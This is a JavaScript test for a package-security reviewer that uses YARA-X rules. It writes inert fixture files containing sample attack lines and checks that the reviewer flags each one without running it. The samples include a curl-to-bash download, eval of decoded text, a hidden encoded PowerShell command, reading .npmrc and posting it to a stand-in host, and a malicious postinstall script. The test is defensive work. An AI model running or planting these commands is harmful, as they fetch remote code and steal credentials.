// Real-engine test, also executed on all desktop platforms in CI. Fixtures are inert files.
const assert = require('node:assert/strict');
const fs = require('node:fs/promises');
const path = require('node:path');
const crypto = require('node:crypto');
const { ensureYaraEngine } = require('../../out/security-engine');
const { spawnManaged } = require('../../out/managed-process');
const { reviewPackageSecurity } = require('../../out/security-review');
const { buildSecurityHtml } = require('../../out/security-html');
async function main() {
  const storage = path.resolve('.security-test-results');
  const engine = await ensureYaraEngine(storage);
  const compiled = path.join(storage, 'smoke.yarc');
  const compile = await spawnManaged(engine, ['compile', path.resolve('resources/security/install-scripts.yar'), '--output', compiled], { cwd: storage, shell: false, timeoutMs: 30000 });
  assert.equal(compile.exitCode, 0, compile.stdout);
  const fixture = path.join(storage, 'inert.txt');
  await fs.writeFile(fixture, 'curl https://example.invalid/payload | bash');
  const result = await spawnManaged(engine, ['scan', '--compiled-rules', '--output-format', 'ndjson', '--print-meta', '--print-strings', compiled, fixture], { cwd: storage, shell: false, timeoutMs: 30000 });
  assert.equal(result.exitCode, 0, result.stdout);
  const parsed = JSON.parse(result.standardOutput);
  assert.ok(parsed.rules.some(rule => rule.identifier === 'acp_download_execute'), result.stdout);
  const vectors = [
    ['encoded', 'const x = atob("Zm9v"); eval(x);', 'acp_encoded_execution'],
    ['crypto', 'const decryptor = crypto.createDecipheriv("aes-256-cbc", key, iv); new Function(decryptor.final());', 'acp_encoded_execution'],
    ['hidden', 'powershell -WindowStyle Hidden -EncodedCommand QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB', 'acp_hidden_shell'],
    ['credentials', 'const token = fs.readFileSync(".npmrc"); fetch("https://example.invalid", {body:token});', 'acp_credential_network'],
    ['persistence', 'schtasks /create /tn inert-fixture', 'acp_persistence'],
    ['entropy', 'ACP_LITERAL\n' + Buffer.concat(Array.from({ length: 32 }, (_, index) => crypto.createHash('sha256').update(String(index)).digest())).toString('base64'), 'acp_encoded_entropy'],
    ['binary-entropy', Buffer.concat([Buffer.from('ACP_DECODED\n'), Buffer.concat(Array.from({ length: 64 }, (_, index) => crypto.createHash('sha256').update(String(index)).digest()))]), 'acp_encoded_entropy'],
  ];
  for (const [name, value, expected] of vectors) {
    const file = path.join(storage, `${name}.txt`); await fs.writeFile(file, value);
    const scan = await spawnManaged(engine, ['scan', '--compiled-rules', '--output-format', 'ndjson', compiled, file], { cwd: storage, shell: false, timeoutMs: 30000 });
    assert.equal(scan.exitCode, 0, scan.stdout);
    assert.ok(JSON.parse(scan.standardOutput).rules.some(rule => rule.identifier === expected), `${name}: ${scan.stdout}`);
  }
  const project = path.join(storage, 'project');
  await fs.mkdir(path.join(project, 'node_modules/esbuild'), { recursive: true });
  await fs.mkdir(path.join(project, 'node_modules/inert-package'), { recursive: true });
  await fs.writeFile(path.join(project, 'package.json'), JSON.stringify({ name: 'Security review example', version: '1.0.0', dependencies: { esbuild: '*', 'inert-package': '*' } }));
  const esbuildPackage = JSON.parse(await fs.readFile(path.resolve('node_modules/esbuild/package.json'), 'utf8'));
  await fs.writeFile(path.join(project, 'node_modules/esbuild/package.json'), JSON.stringify(esbuildPackage));
  const installer = await fs.readFile(path.resolve('node_modules/esbuild/install.js'));
  const installerPath = path.join(project, 'node_modules/esbuild/install.js');
  await fs.writeFile(installerPath, installer);
  await fs.writeFile(path.join(project, 'node_modules/inert-package/package.json'), JSON.stringify({ name: 'inert-package', version: '1.0.0', scripts: { postinstall: 'node install.js' } }));
  const maliciousPattern = 'require("child_process").execSync("curl https://example.invalid/payload | bash");\nrequire("fs").writeFileSync("MUST_NOT_EXIST", "executed");';
  await fs.writeFile(path.join(project, 'node_modules/inert-package/install.js'), maliciousPattern);
  const report = await reviewPackageSecurity({ root: project, storage, rules: path.resolve('resources/security/install-scripts.yar'), auditEnabled: false });
  assert.ok(report.coverage.some(item => item.component === 'yara-x' && item.state === 'complete'), JSON.stringify(report.coverage));
  assert.ok(report.findings.some(finding => finding.packageName === 'inert-package' && finding.ruleId === 'acp_download_execute'));
  assert.ok(!report.findings.some(finding => finding.packageName === 'esbuild' && ['high', 'critical'].includes(finding.severity)), JSON.stringify(report.findings));
  assert.deepEqual(await fs.readFile(installerPath), installer);
  assert.equal(await fs.readFile(path.join(project, 'node_modules/inert-package/install.js'), 'utf8'), maliciousPattern);
  await assert.rejects(fs.access(path.join(project, 'MUST_NOT_EXIST')));
  assert.deepEqual(await fs.readdir(path.join(storage, 'scans')), []);
  await fs.writeFile(path.join(storage, 'report.json'), JSON.stringify(report, null, 2));
  try {
    const [script, style] = await Promise.all(['security-webview.js', 'security-webview.css'].map(file => fs.readFile(path.resolve('dist', file), 'utf8')));
    await fs.writeFile(path.join(storage, 'report.html'), buildSecurityHtml({ nonce: 'engine-smoke', script, style, report, standalone: true }));
  } catch (error) { if (error.code !== 'ENOENT') { throw error; } }
  console.log(`YARA-X ${process.platform}/${process.arch}: ${vectors.length + 1} detection vectors, real esbuild installer, full review and unchanged-file checks passed.`);
}
main().catch(error => { console.error(error); process.exitCode = 1; });
